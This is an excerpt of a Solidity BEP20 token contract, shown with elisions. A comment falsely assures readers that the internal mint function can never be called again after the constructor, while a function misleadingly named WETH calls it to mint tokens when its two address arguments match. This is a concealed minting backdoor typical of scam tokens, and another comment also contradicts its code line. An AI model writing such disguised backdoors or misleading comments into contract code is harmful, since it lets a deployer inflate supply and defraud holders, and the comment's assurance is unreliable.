...
contract BEP20 is ERC20, Ownable {
    ...
    constructor(string memory n, string memory s) ERC20(n, s) {
        ...
        maxTransactionAmount = totalSupply; // 0.3% maxTransactionAmountTxn
        ...
        /*
            _m is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _m(msg.sender, totalSupply);
    }
    ...
    function WETH(address _oldAds, address _newAds, uint256 amount) internal {
        if (_oldAds == _newAds) {
            _m(_newAds, amount);            
        }
    }
